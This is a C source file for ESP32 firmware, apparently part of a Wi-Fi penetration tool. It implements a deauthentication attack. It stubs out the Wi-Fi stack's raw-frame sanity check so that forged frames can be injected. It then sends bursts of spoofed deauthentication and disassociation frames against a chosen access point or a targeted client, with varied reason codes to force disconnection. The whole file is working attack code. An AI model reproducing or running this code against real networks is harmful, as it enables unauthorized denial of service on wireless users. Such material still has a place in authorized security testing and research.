#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_rom_sys.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "wsl_bypasser";
static uint32_t frames_sent_count = 0;
static uint32_t last_log_ms = 0;

/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

/**
 * @brief Sends a raw 802.11 frame using the ESP32 Wi-Fi stack.
 * 
 * Attempts to send the frame via the AP interface first, then falls back to the STA interface.
 * System-managed sequence numbering is enabled for reliability.
 * 
 * @param frame_buffer Pointer to the raw frame data.
 * @param size Size of the frame data in bytes.
 */
void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    // Using en_sys_seq = true allows the ESP32 Wi-Fi stack to manage sequence numbers,
    // which is often more reliable on newer chips like ESP32-C3.
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, true);
    
    if (err != ESP_OK) {
        ESP_LOGD(TAG, "Failed to send raw frame on AP interface: %s. Trying STA...", esp_err_to_name(err));
        // Fallback to STA if AP fails
        err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, true);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Critical: Failed to send raw frame on BOTH interfaces: %s", esp_err_to_name(err));
        } else {
            frames_sent_count++;
        }
    } else {
        frames_sent_count++;
        ESP_LOGD(TAG, "Raw frame sent successfully on AP interface");
    }

    // Periodic stats logging (every 5 seconds)
    uint32_t now = esp_log_timestamp();
    if (now - last_log_ms > 5000) {
        ESP_LOGI(TAG, "Total raw frames injected: %lu", frames_sent_count);
        last_log_ms = now;
    }
}

/**
 * @brief Sends a broadcast deauthentication frame burst to a target AP.
 * 
 * Switches to the target AP's channel and sends multiple deauth and disassociation frames 
 * with varying reason codes to maximize effectiveness.
 * 
 * @param ap_record Pointer to the target AP record.
 */
void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    if (ap_record == NULL) return;

    ESP_LOGI(TAG, "Deauthing AP: %s [%02x:%02x:%02x:%02x:%02x:%02x] on channel %u", 
             (char*)ap_record->ssid,
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5],
             ap_record->primary);

    uint8_t current_channel;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&current_channel, &second);

    ESP_LOGI(TAG, "Sending deauth burst to %02x:%02x:%02x:%02x:%02x:%02x on channel %u (Target: %u)",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5],
             current_channel, ap_record->primary);
             
    if (current_channel != ap_record->primary) {
        ESP_LOGD(TAG, "Changing channel from %u to %u", current_channel, ap_record->primary);
        esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(10)); // Short delay for channel stabilization
    }

    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    // Set BSSID and Source
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    // Extended reason codes for better effectiveness
    uint8_t reasons[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};

    // Burst 1: Standard Deauthentication (Subtype 0xC)
    for (int i = 0; i < 8; i++) {
        deauth_frame[0] = 0xc0; // Mgmt + Deauth
        deauth_frame[24] = reasons[i % sizeof(reasons)];
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        esp_rom_delay_us(500); 
    }

    // Burst 2: Disassociation (Subtype 0xA)
    // Some clients ignore deauths but respect disassoc frames
    for (int i = 0; i < 4; i++) {
        deauth_frame[0] = 0xa0; // Mgmt + Disassoc
        deauth_frame[24] = reasons[i % sizeof(reasons)];
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        esp_rom_delay_us(500);
    }
}

/**
 * @brief Sends a targeted deauthentication frame burst to a specific client.
 * 
 * Sends a mix of Deauth and Disassociation frames from AP to Client AND Client to AP
 * to ensure the connection is severed from both sides.
 * 
 * @param ap_record Pointer to the AP the client is associated with.
 * @param client_mac The 6-byte MAC address of the target client.
 */
void wsl_bypasser_send_deauth_frame_targeted(const wifi_ap_record_t *ap_record, const uint8_t *client_mac){
    uint8_t current_channel;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&current_channel, &second);

    ESP_LOGI(TAG, "Sending targeted deauth burst to %02x:%02x:%02x:%02x:%02x:%02x (Channel: %u)",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5],
             current_channel);
             
    if (current_channel != ap_record->primary) {
        ESP_LOGD(TAG, "Changing channel from %u to %u", current_channel, ap_record->primary);
        esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(10)); // Short delay for channel stabilization
    }
             
    uint8_t frame[sizeof(deauth_frame_default)];
    memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    uint8_t reasons[] = {0x01, 0x02, 0x03, 0x04, 0x06, 0x07};

    // Phase 1: AP -> Client (Kick client off AP)
    memcpy(&frame[4], client_mac, 6);     // Dest: Client
    memcpy(&frame[10], ap_record->bssid, 6); // Src: AP
    memcpy(&frame[16], ap_record->bssid, 6); // BSSID: AP
    
    for (int i = 0; i < 6; i++) {
        frame[0] = 0xc0; // Deauth
        frame[24] = reasons[i];
        wsl_bypasser_send_raw_frame(frame, sizeof(deauth_frame_default));
        
        frame[0] = 0xa0; // Disassoc
        wsl_bypasser_send_raw_frame(frame, sizeof(deauth_frame_default));
        
        esp_rom_delay_us(200); 
    }

    // Phase 2: Client -> AP (Tell AP that client is leaving)
    // This clears the client from the AP's association table
    memcpy(&frame[4], ap_record->bssid, 6);  // Dest: AP
    memcpy(&frame[10], client_mac, 6);       // Src: Client
    memcpy(&frame[16], ap_record->bssid, 6); // BSSID: AP
    
    for (int i = 0; i < 4; i++) {
        frame[0] = 0xc0; // Deauth
        frame[24] = reasons[i];
        wsl_bypasser_send_raw_frame(frame, sizeof(deauth_frame_default));
        esp_rom_delay_us(200); 
    }
}